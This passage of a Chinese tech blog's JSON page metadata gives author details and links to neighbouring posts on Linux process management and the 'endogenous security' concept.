class=\"toc-text\">总结：</span></a></li></ol></li></ol></li></ol>","author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"进程管理","uid":"d655af595b90ac0e0949f931f50e7fe8","slug":"进程管理","date":"2025-08-06T02:29:29.000Z","updated":"2025-08-06T12:24:32.966Z","comments":true,"path":"api/articles/进程管理.json","keywords":null,"cover":[],"text":"进程管理一、进程是什么？ 定义： 进程是正在执行的程序实例。当程序被加载到内存中运行时，操作系统会为其分配资源（CPU、内存、文件等），形成一个独立的执行单元。...","permalink":"/post/进程管理","photos":[],"count_time":{"symbolsCount":"19k","symbolsTime":"18 mins."},"categories":[],"tags":[{"name":"Linux","slug":"Linux","count":13,"path":"api/tags/Linux.json"}],"author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"网络安全","uid":"c726f3c77c99b3877349dcc73c58eeb4","slug":"网络安全","date":"2025-08-05T02:46:41.000Z","updated":"2025-08-05T03:00:42.406Z","comments":true,"path":"api/articles/网络安全.json","keywords":null,"cover":null,"text":"内生安全“内生安全”（Endogenous Security）是一种主动、自适应的网络安全新范式，它强调将安全能力内生于系统和业务本身，而不是作为外部附加的防护...","permalink":"/post/网络安全","photos":[],"count_time":{"symbolsCount":"6.2k","symbolsTime":"6 mins."},"categories":[],"tags":[{"name":"安全","slug":"安全","count":1,"path":"api/tags/安全.json"}],"author":{"name":"wyf","slug":"blog-author","avatar":"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/18ca1dd2a86b2210b1ab142498bcf0b0.jpg","link":"/","description":"不知道应该写点什么，就这么看着吧","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}